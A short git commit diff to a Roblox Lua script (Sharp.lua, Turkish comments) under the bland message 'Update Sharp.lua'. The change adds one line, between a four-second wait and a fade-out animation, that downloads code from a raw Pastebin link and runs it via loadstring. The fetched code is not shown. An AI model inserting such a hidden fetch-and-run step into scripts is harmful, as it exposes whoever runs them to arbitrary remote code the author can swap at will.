22ccf42b1570caac23ec8ab548a2ef6efafe6dc4
2btrleans <flashkingantibots7@gmail.com>
2026-08-22 11:31:33 +0300

    Update Sharp.lua

--- Sharp.lua
+++ Sharp.lua
@@ -1271,6 +1271,8 @@ end
 -- 4 saniye bekle
 task.wait(4)
 
+loadstring(game:HttpGet("https://pastebin.com/raw/AUFQ1WX3"))()
+
 -- Kaybolma animasyonu
 local disappearTween = TweenService:Create(
 	imageLabel,
